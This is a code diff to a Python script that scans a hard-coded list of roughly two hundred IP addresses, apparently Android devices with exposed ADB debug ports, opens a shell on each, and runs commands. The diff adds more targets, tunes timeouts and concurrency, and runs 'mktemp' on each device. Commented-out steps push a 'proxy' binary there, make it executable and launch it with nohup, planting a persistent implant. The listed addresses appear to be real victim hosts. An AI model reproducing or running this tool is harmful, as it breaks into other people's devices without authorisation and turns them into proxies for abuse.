@@ -14,6 +14,14 @@ ips += ["24.66.18.93"]
 ips += ["123.161.222.42","1.196.248.22","115.57.161.216","123.7.117.99","123.7.117.72","123.161.222.238","171.11.98.187","125.43.65.48","61.52.151.193","123.4.255.51"]
 ips += ["112.118.71.40","1.64.3.128","219.73.96.81","223.19.211.52","221.127.152.169","218.250.91.58","168.70.19.134","221.127.29.19","119.236.28.58","223.16.75.114"]
 ips += ["45.219.38.173","45.219.27.255","160.167.12.217","154.148.78.111","105.188.20.211","196.69.254.30","160.173.213.241","196.69.176.34","196.126.2.28","196.67.191.15"]
+ips += ["78.130.55.157","79.22.136.112","1.36.190.240","93.90.76.234","223.19.105.245","81.198.200.133","83.82.117.159","116.148.245.139","218.103.248.199","93.177.214.235"]
+ips += ["160.173.237.3","5.150.213.145","93.90.76.145","112.119.202.192","113.199.90.15","223.241.60.234","109.123.36.243","119.237.45.179","77.120.220.247","84.224.19.89"]
+ips += ["211.251.13.206","59.12.169.43","112.185.203.51","61.83.187.230","112.173.159.196","218.152.227.118","218.147.96.68","14.47.213.217","221.163.54.78","220.73.62.168"]
+ips += ["121.181.164.130","222.112.172.119","121.136.91.193","221.161.144.180","210.91.177.81","59.12.169.92","175.199.237.55","14.47.213.116","121.185.158.85","119.194.16.73"]
+ips += ["1.36.190.240","112.119.202.192","119.237.45.179","42.98.152.236","218.250.200.154","203.218.131.191","219.73.21.61","42.3.89.243","219.77.152.173","112.118.89.6"]
+ips += ["112.118.101.7","116.49.110.1","112.118.110.95","58.153.151.114","112.118.162.2","119.237.9.241","116.48.111.129","112.118.111.237","112.118.102.203","119.237.74.87"]
+ips += ["50.82.117.94","99.119.3.40","198.154.99.4","173.29.188.192","153.33.230.117","169.237.31.243","70.118.247.8","205.134.224.169","162.201.130.99","104.145.124.220"]
+ips += ["153.141.169.12","116.80.32.99","124.255.238.43","124.255.238.42","124.255.238.114","202.238.150.197","157.101.166.72","157.101.166.69","49.111.255.237","153.141.169.105"]
 ips = list(set(ips))
 # import subprocess
 
@@ -40,6 +48,7 @@ ips = list(set(ips))
 import asyncio
 import shlex
 import os.path
+import random
 
 import timeout
 
@@ -47,7 +56,7 @@ import timeout
 async def run(*command, input=None, **s):
     try:
         process = await asyncio.subprocess.create_subprocess_exec(*command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, stdin=asyncio.subprocess.PIPE)
-        stdout, stderr = await timeout.run_with_timeout(process.communicate(input=input), 4)
+        stdout, stderr = await timeout.run_with_timeout(process.communicate(input=input), 2)
         return process.returncode, stdout, stderr
     finally:
         del process
@@ -80,27 +89,32 @@ async def adb_shell(ip):
     except StopAsyncIteration:
         return None
 
+l = asyncio.Lock()
+
 async def process_one_ip(ip):
-    shell = await adb_shell(ip)
-    if not shell:
-        return
-    print(f'__ connected to {ip}')
-    try:
-        a=await shell('pwd')
-        print(a)
-        # print(f'__ mktemp works for {ip}')
-        # if a[1] and a[1][0]!=b'/' or b' ' in a[1] or b':' in a[1]:
-        #     return
-        # filename = a[1].strip()
-        # print(ip, a, filename)
-        # a=await shell('push', 'proxy',filename, _mode=None)
-        # print(ip, a)
-        # a=await shell('chmod', '+x', filename)
-        # print(ip, a)
-        # a=await shell(f'cd {os.path.dirname(filename)}; (nohup {filename} &); echo $!')
-        # print(ip, a)
-    except asyncio.TimeoutError:
-        pass
+    await asyncio.sleep(random.random())
+    async with l:
+        shell = await adb_shell(ip)
+        if not shell:
+            return
+        print(f'__ connected to {ip}')
+        try:
+            # a=await shell('pwd')
+            # print(a, ip)
+            a=(await shell('mktemp'))
+            print(a)
+            # if not a[1] or a[1][0]!=b'/' or b' ' in a[1] or b':' in a[1]:
+            #     return
+            # filename = a[1].strip()
+            # print(ip, a, filename)
+            # a=await shell('push', 'proxy',filename, _mode=None)
+            # print(ip, a)
+            # a=await shell('chmod', '+x', filename)
+            # print(ip, a)
+            # a=await shell(f'cd {os.path.dirname(filename)}; (nohup {filename} &); echo $!')
+            # print(ip, a)
+        except asyncio.TimeoutError:
+            pass
     # if a[2].startswith('ls:'):
     #     print(ip)
 
